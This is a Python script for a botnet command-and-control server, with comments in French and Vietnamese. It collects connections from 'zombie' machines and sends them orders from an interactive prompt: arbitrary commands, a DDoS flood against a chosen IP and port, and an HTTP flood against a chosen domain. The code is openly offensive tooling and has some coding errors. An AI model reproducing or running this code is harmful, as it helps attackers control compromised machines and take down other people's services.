import socket
import threading
import time

list_hostname = []
z_command = "empty"
notice = "hello world"

# definition du thread
nb_z = 0
class Thread(threading.Thread):
    global z_command
    def __init__(self, conn):
        threading.Thread.__init__(self)
        self.conn = conn
    
    def run(self):
        data = self.conn.recv(1024)
        data = data.decode("utf8")
        if(z_command == "getname"):
            print("\nServer: Zombie name :", data)
        else:
            print("\nServer:", data)
        

#-------------------------------------------------------------------

#c'est assez explicite la
host, port = ('hostlocal', port)

#debut du serv
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))

print("Server: server on !")
print("Server: you are ", s.getsockname())
print("Waiting for bot...")


#sockname = socket.recv(1024).decode()
list_cmd = ["help", "refresh"]

#etablir la connection
s.listen(5) # cho phép tối đa 5 kết nối đồng thời
while True:
    def command(conn):
        cmd = input("\n*----------Press Enter :----------*")

        while(cmd != [list_cmd]):
            cmd = input("\nBotnet>")
            
            if(cmd == "help"):
                print("""
                |-- Help: ------------------------------------------------------------------|
                |  help               : Display this help screen                            |
                |  cmd                : Send a command to all bots                          |
                |  refresh            : Refresh request from bots to the server             |
                |  http               : HTTP-Flood (GET)                                    |
                |  flood              : Execute a DDoS attack with bots you have            |
                |  how to cook an egg : Teach you how to cook an egg                        |
                |  close              : Close all connections with bots and stop the server |
                |---------------------------------------------------------------------------|
                """)
            if(cmd == "refresh"):
                break
            
            if(cmd == "how to cook an egg"):
                print("\nWell, you can cook an egg by putting butter in a pan, and then, break your egg and put it in the pan too (pay attention to pieces of shells)")
            
            if(cmd == "cmd"):
                x = 0
                z_command = input("\nCommand: ")
                #z_command = z_command + tip
                z_command = z_command.encode()
                
                for conn in list_hostname:
                    conn.send(z_command)

            if(cmd == "flood"):
                target_ip = input("\nEnter the ip target: ")
                target_port = int(input("\nEnter the port target: "))
                print("\nserver: DDoS attack in progress...")
                z_command = f"attack {target_ip} {target_port}"
                z_command = z_command.encode()
                for conn in list_hostname:
                    conn.send(z_command)
               
            if cmd == "http":
                domain = input("Nhập tên miền: ")
                notice = f"./getblaze --hostname https://{domain}"
                notice = notice.encode()
                for conn in list_hostname:
                    conn.sendall(notice)

            if(cmd == "close"):
                print("\nClosing all connections...")
                for conn in list_hostname:
                    conn.send("close".encode())
                    conn.close()
                s.close()
                exit()

    conn, addr = s.accept()
    hostname = conn.recv(1024).decode()
    list_hostname.append(conn) # thêm kết nối vào danh sách
    nb_z = nb_z + 1
    print("Server: "+str(nb_z)+" zombie connected from "+str(addr)+" : "+str(hostname))
    
    thread = Thread(conn)
    thread.start()
    
    t = threading.Thread(target=command, args=(conn,))
    t.start()